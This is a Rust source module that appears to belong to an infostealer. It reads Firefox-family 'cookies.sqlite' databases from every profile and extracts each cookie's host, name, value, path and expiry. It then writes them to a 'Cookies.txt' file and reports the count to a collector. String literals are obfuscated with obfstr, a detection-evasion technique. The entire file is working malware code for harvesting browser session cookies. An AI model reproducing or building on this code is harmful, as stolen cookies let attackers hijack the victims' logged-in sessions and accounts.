use crate::alloc::borrow::ToOwned;
use crate::gecko::GeckoBrowserData;
use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Cookie};
use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::{Browser, Collector};
use database::TableRecord;
use obfstr::obfstr as s;
use tasks::{parent_name, Task};
use utils::path::Path;

const MOZ_COOKIES_NAME: usize = 2;
const MOZ_COOKIES_VALUE: usize = 3;
const MOZ_COOKIES_HOST: usize = 4;
const MOZ_COOKIES_PATH: usize = 5;
const MOZ_COOKIES_EXPIRY: usize = 6;

pub(super) struct CookiesTask<'a> {
    browser: Arc<GeckoBrowserData<'a>>
}

impl<'a> CookiesTask<'a> {
    pub(super) fn new(browser: Arc<GeckoBrowserData<'a>>) -> Self {
        Self { browser }
    }
}

impl<C: Collector> Task<C> for CookiesTask<'_> {
    parent_name!("Cookies.txt");

    unsafe fn run(&self, parent: &Path, collector: &C) {
        let Some(cookies) = collect_and_read_sqlite_from_all_profiles(
            &self.browser.profiles,
            |profile| profile / s!("cookies.sqlite"),
            s!("moz_cookies"),
            extract_cookies_from_record
        ) else {
            return
        };

        collector.get_browser().increase_cookies_by(cookies.len());
        let _ = to_string_and_write_all(&cookies, "\n", parent);
    }
}

fn extract_cookies_from_record(record: &dyn TableRecord) -> Option<Cookie> {
    let host_key = record.get_value(MOZ_COOKIES_HOST)?.as_string()?.to_owned();
    let name = record.get_value(MOZ_COOKIES_NAME)?.as_string()?.to_owned();
    let path = record.get_value(MOZ_COOKIES_PATH)?.as_string()?.to_owned();
    let expires = record.get_value(MOZ_COOKIES_EXPIRY)?.as_integer()?.to_owned();
    let value = record.get_value(MOZ_COOKIES_VALUE)?.as_string()?.to_owned();

    Some(Cookie {
        host_key,
        name,
        value,
        path,
        expires_utc: expires
    })
}